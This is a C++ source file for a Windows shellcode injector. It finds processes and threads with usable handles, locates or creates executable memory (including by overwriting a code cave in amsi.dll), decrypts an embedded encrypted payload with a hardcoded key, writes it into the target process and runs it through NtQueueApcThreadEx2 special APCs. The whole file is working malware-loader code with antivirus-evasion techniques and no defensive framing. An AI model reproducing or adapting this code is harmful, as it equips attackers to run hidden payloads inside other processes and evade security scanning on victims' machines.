#include <iostream>
#include <Windows.h>
//#include <Psapi.h>
#include <deque>
#include <thread>
#include <tlhelp32.h>
#include "Shcd.h"
//#include <winternl.h>
#include "MapFreeMemoryObjects.h"
#include "ProcessThreadPair.h"
#include "RWXFinder.h"
#include "InjectionCandidate.h"
#include "CustomWriteProcessMemory.h"
#include "FindThread.h"


using namespace std;

#pragma comment(lib, "ntdll.lib")

typedef PVOID PPS_APC_ROUTINE;

typedef NTSTATUS(NTAPI* pNtQueueApcThreadEx2_FIXED)(
	_In_ HANDLE ThreadHandle,
	_In_opt_ HANDLE ReserveHandle,
	_In_ ULONG ApcFlags,
	_In_ PPS_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
	);

unsigned char executableCode[] = "\xe3\x24\x00\x00\x43\x5f\x00\x00\x68\x6d\x00\x00\xa5\x6b\x00\x00\x73\x7b\x9c\x98\x9f\xb0\xca\x75\xb3\xc3\x24\xa9\x50\xa5\x9a\x33\x4e\xab\xba\xa6\x97\x05\xd1\x8a\x20\xd4\xe7\x1a\xbe\xd0\x47\x2f\x03\x4e\x21\x3b\x18\xbc\x3f\x51\x2c\x6a\x73\xf8\x84\xe8\x78\xd1\x86\x93\xc6\xf4\x8a\xb2\x64\xd2\x03\x27\x99\xfb\xc7\x44\x49\x45\x70\xea\x8c\x68\x9a\x51\x8a\x84\x7a\x3b\x59\x8d\x30\x6e\x25\x30\xe7\x33\x34\x40\x5b\x52\xcd\x03\x9d\x63\x9b\xe4\x76\x3f\xfd\x00\x17\xb4\xef\x32\xf9\xfb\x58\x89\xd0\x5a\xcd\x5a\x8f\x61\x48\x91\x24\xf4\xcc\xb3\xe3\x61\x18\x77\xa1\xf9\x04\x3b\x09\x5e\x96\xf2\xe8\xbd\xf5\xca\xb2\x83\x2b\x18\xae\xd8\x20\x43\x1b\xf4\x52\x05\x83\x9c\x70\x92\xe7\x50\x5b\xff\xf6\x24\x6e\x6f\xcc\x8c\x27\x83\xab\x31\x43\xc1\x41\x88\x92\x15\xd4\x54\x1e\x9a\x75\x88\xa2\x98\xbc\x80\x61\x19\x02\x74\xd5\xbe\x14\xe8\xfc\xfd\x5f\xf3\xb9\xdd\x9a\x37\x50\x6f\x20\x3d\x3a\x34\xc3\x16\x7d\xd1\x0b\x69\x32\x50\x91\x61\xec\x94\xc0\x55\xf5\x31\xa2\x5b\xa7\x94\xc5\x07\x0f\xd4\x0a\x2d\x34\x1b\x51\xbc\x86\xd2\xdb\x37\xc6\x2f\x86\x90\xc6\x8a\x09\x9e\x6d\x28\xab\x31\x0b\x0e\xea\x89\x8a\x20\xeb\x51\x4d\x9b\xaa\x19\xdd\xc6\xe0\x9a\xf5\xa1\x0c\xea\x30\x0c\xc6\x94\x42\xe4\x7d\x14\xdf\x63\x42\x58\x8d\x1f\xf6\x9b\xbe\xd7\x03\x7f\x79\xdf\x2a\x8f\x0c\xdd\x5d\x1e\xb5\xfc\x66\x02\x1f\x7a\x4b\xde\xdb\xb7\xd7\x1f\xdd\x49\x36\x8b\x1e\x18\x78\x09\x74\xea\x9c\x2b\x8e\xd6\xd5\xef\x83\x9b\xb3\x60\xb5\xaf\x1f\x92\x86\x0e\x84\xcb\xa3\xee\x73\x73\xb9\xd3\xfe\xc6\xc1\xf8\x33\x38\x6a\x10\x17\xe7\x2e\x5f\xab\xba\xad\x48\xff\xa7\x58\x22\x73\xc0\xd2\xd5\x37\x1f\x9a\x26\xcd\xcc\xb0\x8e\x47\xd5\x78\x61\x5d\xb1\x66\x93\xe7\xa3\xfb\x9d\x4d\x98\x9d\x75\x07\xbb\x93\xd4\x93\x8f\xd6\x56\x9e\x17\x35\x49\x8b\xc0\xa1\x4d\xb4\xa5\x7a\x3d\xe1\xec\xf6\x91\x50\x83\xe8\xeb\x84\x29\x38\x93\x5d\x4f\x90\xae\x08\x90\xd0\x26\x31\xf2\x5f\x65\x6a\xde\x96\x48\xc4\xdf\xe7\x8b\x0d\xb2\xca\x35\xb4\x09\x64\xf9\x53\x9b\x35\x85\x09\x78\x13\x5a\x25\xc4\x38\x25\xae\xc1\x62\x6b";

SIZE_T shellcodeSize = sizeof(executableCode);

int main(){
    // 1. Find a opened process
    MapMemoryObjects memoryObjects = MapMemoryObjects();
    PSYSTEM_HANDLE_INFORMATION memoryObjectList = memoryObjects.MapMemoryHandlers();
	deque<ProcessThreadPair> threads = memoryObjects.FindProcessThreadPairs(memoryObjectList, PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION, THREAD_SET_CONTEXT);

	if (threads.size() == 0) {
	//if (threads.size() != 0) {
		std::cout << "No processes + thread with required access found." << std::endl;
		// If no pair found, just use a process with required access, and then open manually a thread in it
		deque<HANDLE> processes = memoryObjects.FilterProcesses(memoryObjectList, PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION);
		if (processes.size() == 0) {
			std::cout << "No processes with required access found." << std::endl;
			return 1;
		}
		for (const auto& processHandle : processes) {
			//HANDLE threadHandle = getFirstThreadHandleByPID(GetProcessId(processHandle));
			HANDLE threadHandle = FindBestApcThread(GetProcessId(processHandle));
			if (threadHandle != NULL) {
				ProcessThreadPair pair;
				pair.hProcess = processHandle;
				pair.hThread = threadHandle;
				pair.processId = GetProcessId(processHandle);
				pair.threadId = GetThreadId(threadHandle);
				threads.push_back(pair);
				std::cout << "Found process + thread with required access: PID " << pair.processId << " | TID " << pair.threadId << std::endl;
				break;
			}
		}
	}
	for (const auto& pair : threads) {
		std::cout << "Found process with required access: PID " << pair.processId << " | TID " << pair.threadId << std::endl;
	}

	// 2. Find a RWX memory region in the opened process
	InjectionCandidate candidate;
    bool found = false;
	bool firstTimeHere = false;
    for(const auto& pair : threads) {
        std::cout << "Process ID: " << pair.processId << " | Thread ID: " << pair.threadId << std::endl;
		candidate.processId = pair.processId;
		candidate.threadId = pair.threadId;
		candidate.hProcess = pair.hProcess;
		candidate.hThread = pair.hThread;
        LPVOID rwx = FindRWX(pair.hProcess, shellcodeSize);
        if (rwx) {
            std::cout << "Found RWX memory at: " << rwx << std::endl;
			candidate.rwxAddress = rwx;
			
			found = true;
			std::cout << "Using process ID: " << candidate.processId << " | Thread ID: " << candidate.threadId << " and RWX address: " << candidate.rwxAddress << std::endl;
            break;
        } else {
            std::cout << "No RWX memory found in process." << std::endl;
		}
	}
	if (!found) {
		// If no RWX memory found, allocate some
		LPVOID rwx = NULL;
        std::cout << "No RWX memory regions found in any opened processes." << std::endl;
		HMODULE hRemoteAmsi = GetRemoteModuleHandle(candidate.hProcess, "amsi.dll");
		if(hRemoteAmsi){
			std::cout << "Remote Amsi.dll module found at: " << hRemoteAmsi << std::endl;
			LPVOID amsiCave = GetAmsiEntryPointCave(candidate.hProcess, hRemoteAmsi);
			//LPVOID amsiCave = FindCodeCave(candidate.hProcess, hRemoteAmsi, shellcodeSize);
			DWORD oldProtection;
			bool resultVP = VirtualProtectEx(candidate.hProcess, amsiCave, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			if (resultVP) {
				rwx = amsiCave;
			}
		} else {
			std::cout << "Remote Amsi.dll module not found." << std::endl;
			rwx = VirtualAllocEx(candidate.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		}	


		if (rwx) {
			std::cout << "Allocated RWX memory at: " << rwx << std::endl;
			candidate.rwxAddress = rwx;
			found = true;
		}
		else {
			DWORD err = GetLastError();
			std::cout << "Failed to allocate RWX memory in process. Error: "
				<< err << std::endl;
			return 1;
		}
    }

	//2.1 Decrypt shellcode 
	unsigned char* payloadDec = decryptShellcode(executableCode, sizeof(executableCode), "A9xK4R0E2Wc6B1D8P5N7ZL3GJQHfIeMy");
	SIZE_T payloadDecLen = sizeof(executableCode);


	using resolvedNtQueueApcThreadEx2 = NTSTATUS(NTAPI*)(
		HANDLE ThreadHandle,
		HANDLE ReserveHandle,
		ULONG ApcFlags,
		PPS_APC_ROUTINE ApcRoutine,
		PVOID ApcArgument1,
		PVOID ApcArgument2,
		PVOID ApcArgument3
		);

	resolvedNtQueueApcThreadEx2 fNtQueueApcThreadEx2 = (resolvedNtQueueApcThreadEx2)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThreadEx2"));

    // 3. Write shellcode to the RWX memory region
	LPVOID rmtPointer = getPEBUnused(candidate.hProcess);
	LPVOID remoteAddress = CustomWriteProcessMemory(candidate.hProcess, payloadDec, payloadDecLen, rmtPointer, candidate.hThread, candidate.rwxAddress);
	if (!remoteAddress) {
		std::cerr << "CustomWriteProcessMemory failed\n";
		SIZE_T bytesWritten;
		WriteProcessMemory(candidate.hProcess, candidate.rwxAddress, payloadDec, payloadDecLen, &bytesWritten);
	}

	/*DWORD atry = fNtQueueApcThreadEx2(candidate.hThread, NULL, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, (PPS_APC_ROUTINE)memcpy, (void*)candidate.rwxAddress, (void*)remoteAddress, (void*)payloadDecLen);
	cout << "GetThreadDescription NtQueueApcThreadEx2 result: " << hex << atry << endl;*/


	Sleep(3000);
	
	cout << "Candidate.rwxAddress: " << hex << candidate.rwxAddress << endl;

    // 4. Execute the shellcode with a openend thread using NtQueueApcThreadEx2
	DWORD res = fNtQueueApcThreadEx2(candidate.hThread, NULL, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
		(PPS_APC_ROUTINE)candidate.rwxAddress, NULL, NULL, NULL);

	
	cout << "NtQueueApcThreadEx2 result: " << hex << res << endl;

	getchar();
	return 0;
}
